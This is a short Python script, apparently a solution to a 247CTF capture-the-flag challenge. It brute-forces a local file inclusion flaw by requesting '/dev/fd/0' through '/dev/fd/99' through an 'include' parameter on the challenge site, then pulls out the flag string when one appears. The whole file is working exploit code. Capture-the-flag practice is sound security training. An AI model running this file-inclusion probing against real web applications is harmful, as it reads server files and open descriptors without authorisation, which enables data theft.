import requests
import re

url = 'https://6c2158f79f6dbfe7.247ctf.com/'

for i in range(100):
    print(f"Trying: {i}")

    res = requests.get(url, params={
        'include': f'/dev/fd/{i}'
    })

    if "247" in res.text:
        flag = re.findall(r'(247CTF{.+})', res.text)[0]
        print("Flag:", flag)
        break